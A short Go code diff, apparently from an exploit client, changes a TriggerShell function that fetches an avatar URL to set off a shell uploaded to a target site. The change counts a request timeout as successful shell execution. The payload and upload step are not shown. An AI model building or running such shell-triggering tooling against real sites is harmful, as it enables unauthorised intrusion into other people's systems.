@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"mime/multipart"
+	"net"
 	"net/http"
 	"net/http/cookiejar"
 	"net/textproto"
@@ -394,6 +395,11 @@ func (c *Client) PullUserInfo() (info UserInformation, success bool, message str
 func (c *Client) TriggerShell(avatarURL string) (success bool, message string) {
 	resp, err := c.Session.Get(avatarURL)
 	if err != nil {
+		// If there is a timeout, the shell has execute successfully.
+		if e, ok := err.(net.Error); ok && e.Timeout() {
+			return true, "shell execution successful."
+		}
+
 		return false, err.Error()
 	}
 	defer resp.Body.Close()
